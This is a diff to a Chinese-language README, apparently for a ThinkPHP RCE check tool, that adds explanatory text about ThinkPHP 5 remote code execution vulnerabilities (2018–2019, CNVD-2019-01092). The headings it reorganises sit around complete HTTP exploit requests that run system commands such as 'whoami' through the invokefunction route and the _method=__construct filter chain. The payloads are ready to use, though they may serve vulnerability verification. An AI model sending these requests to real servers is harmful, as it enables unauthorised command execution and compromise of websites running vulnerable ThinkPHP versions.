@@ -1,6 +1,8 @@
 # thinkphp_rce_check
 
-2018年12月爆出的代码执行
+## 2018年12月爆出的代码执行
+
+ThinkPHP版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。
 
 ```
 GET /tp5022/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=path HTTP/1.1
@@ -17,11 +19,14 @@ Content-Length: 2
 
 
 ---
-2019年1月陆续爆出的代码执行
+
+## 2019年1月陆续爆出的代码执行
 
 CNVD-2019-01092
 
-## thinkphp 5.0.10 以下版本 
+ThinkPHP5.0.23以前的版本及5.1.x/5.2.x中，获取method的方法中没有正确处理方法名，导致攻击者可以调用Request类任意方法并构造利用链，从而导致远程代码执行漏洞。
+
+### thinkphp 5.0.10 以下版本 
 
 ```
 POST /tp5010/public/index.php?s=index/index/index HTTP/1.1
@@ -38,7 +43,7 @@ Upgrade-Insecure-Requests: 1
 s=whoami&filter%5B%5D=passthru&_method=__construct&method=
 ```
 
-## thinkphp 5.0.23 以下版本
+### thinkphp 5.0.23 以下版本
 
 ```
 POST /tp5023/public/index.php?s=captcha HTTP/1.1
@@ -56,7 +61,7 @@ _method=__construct&filter[]=passthru&method=get&server[REQUEST_METHOD]=whoami
 _method=__construct&filter[]=system&method=GET&get[]=whoami
 ```
 
-## thinkphp 5.1.x/5.2.x 版本
+### thinkphp 5.1.x/5.2.x 版本
 
 利用条件:生产模式/即忽略异常提示，否则会报500错误
 
